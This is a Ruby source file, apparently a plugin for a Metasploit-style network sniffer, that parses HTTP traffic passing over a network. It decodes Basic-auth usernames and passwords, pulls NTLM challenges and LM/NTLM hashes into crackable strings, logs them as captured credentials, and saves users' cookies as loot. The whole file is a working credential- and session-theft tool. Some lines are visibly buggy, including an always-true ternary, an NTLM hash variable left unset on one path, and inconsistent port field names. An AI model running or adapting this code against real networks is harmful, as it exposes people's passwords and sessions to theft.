require 'pp'
require 'base64'

class PigHTTP < PigParser
	MESSAGE = Rex::Proto::NTLM::Message
        def can_parse(packet)
		return false if not packet.class == PacketFu::TCPPacket
		return false if not packet.payload[0..2048] =~ /HTTP/
                return true
        end

	def parse_http(data)
		headers = {}
		(head,body) = data.split("\r\n\r\n",2)
		lines = head.split("\r\n")
		req = lines.shift.split(" ")
		request = {}
		request[:method] = req[0]
		request[:uri] = req[1]
		
		lines.each do |l|
			(k,v) = l.split(": ")
			headers[k.to_sym] = v
		end
		return request,headers,body
		
	end
	
	def parse(pkt)
		(req,head,body) = parse_http( pkt.payload)
		if(head[:Authorization] || head[:"WWW-Authenticate"])
			meth,val = head[:Authorization].split(" ",2) if head[:Authorization]
			meth,val = head[:"WWW-Authenticate"].split(" ",2) if head[:"WWW-Authenticate"]
			if(val)
				case meth
					when "Basic"
						(user,pass) = Base64.decode64(val).split(":")
						print_status("User: #{user} PASS: #{pass}")
                        			report_auth_info(
                                			:host  => pkt.ip_daddr,
                                			:port => pkt.tcp_dport,
                                			:sname => 'http',
                                			:user => user,
                                			:pass => pass,
                                			:type => 'basic_auth',
                                			:source_type => "captured",
                                			:active => true
                        			)


					when "NTLM"
						ntlm = Base64.decode64(val)	
						if(ntlm.include? "NTLMSSP\x00\x02")
							@http_nonce = {} if @http_nonce == nil
							nonce = ntlm[24,8].unpack("H*").first
							@http_nonce["#{pkt.ip_src}-#{pkt.ip_dst}"] = nonce
						end
							
						if(ntlm.include? "NTLMSSP\x00\x03")
							domain,user,host,lm_hash,ntlm_hash = MESSAGE.process_type3_message(val)
							lm_cli_challenge = nt_cli_challenge = nil
							type = "smb_netv1_hash"
							if lm_hash.length > 24
								lm_cli_challenge = lm_hash[32,16]
								lm_hash = lm_hash[0,32]
								nt_cli_challenge = ntlm_hash[32,16]
								nt_hash = ntlm_hash[0,32]
								type = "smb_netv2_hash"
							
							end

							print "#{lm_hash.length}:#{lm_hash}\n"
							domain = Rex::Text.to_ascii(domain)
							user=  Rex::Text.to_ascii(user)
							host =  Rex::Text.to_ascii(host)
							nonce = @http_nonce["#{pkt.ip_dst}-#{pkt.ip_src}"]
							print_status("#{user}::#{domain}:#{lm_hash}:#{ntlm_hash}:#{nonce}")
                        				report_auth_info(
                                				:host  => pkt.ip_daddr,
                                				:port => pkt.tcp_dst,
                                				:sname => 'http',
                                				:user => user,
                                				:pass => domain + ":" +
                                        				( lm_hash + lm_cli_challenge.to_s ? lm_hash + lm_cli_challenge.to_s : "00" * 24 ) + ":" +
                                        				( nt_hash + nt_cli_challenge.to_s ? nt_hash + nt_cli_challenge.to_s :  "00" * 24 ) + ":" +
                                        				nonce,
                                				:type => type,
                                				:proof => "NAME=#{pkt.ip_saddr} DOMAIN=#{domain}",
                                				:source_type => "captured",
                                				:active => true
                        )

						end	
				end
			end
		end

		if head[:Cookie]
			data = req
			@cnt = 0 if @cnt.nil?
			data[:cookie] = head[:Cookie]
			data[:host] = head[:Host]
			data[:cnt] = @cnt
                	filename= "#{pkt.ip_saddr}-#{pkt.ip_daddr}-#{@cnt}_cookies.txt"
                	store_loot("http.cookies", "text/plain", pkt.ip_daddr, data.to_s, filename, "HTTP Cookies", "http")

			@cnt = @cnt + 1
		end

								
	end # end of parse
end

